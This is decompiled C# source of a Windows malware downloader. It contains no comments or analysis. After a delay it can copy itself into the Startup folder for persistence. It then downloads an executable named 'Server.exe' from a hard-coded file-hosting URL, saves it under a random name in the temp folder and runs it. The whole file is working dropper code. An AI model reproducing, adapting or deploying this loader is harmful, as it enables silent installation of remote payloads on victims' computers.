using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;
using SmartAssembly.License;
using SmartAssembly.SmartExceptionsWithoutUI;

[StandardModule]
internal sealed class Pro
{
	[STAThread]
	public static void main()
	{
		if (!License.Validate() || !UnhandledExceptionHandlerWithoutUI.AttachApp())
		{
			return;
		}
		checked
		{
			try
			{
				Thread.Sleep((int)Math.Round(Conversion.Val(dwn(3)) + 100.0));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string text = "QWERTYUIOPASDFGHJKLZXCVBNM1234567890qazxswedcvfrtgbnhyujmkiolp";
			string text2 = "";
			int num = 0;
			try
			{
				num = 0;
				do
				{
					text2 += Conversions.ToString(text[(int)Math.Round(VBMath.Rnd() * (float)text.Length - 1f)]);
					num++;
				}
				while (num <= 20);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(dwn(2), "", false) != 0)
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + dwn(2) + ".exe", true);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			WebClient webClient = new WebClient();
			webClient.DownloadFile(dwn(1), Path.GetTempPath() + "\\" + text2 + ".exe");
			Process.Start(Path.GetTempPath() + "\\" + text2 + ".exe");
		}
	}

	public static string dwn(int I)
	{
		string text = default(string);
		return I switch
		{
			1 => "http://rghost.net/download/55087390/1b17fe5b3d26b6aa455faeb252eab9ec6bdce1c8/Server.exe", 
			2 => "", 
			3 => "20000", 
			_ => text, 
		};
	}
}
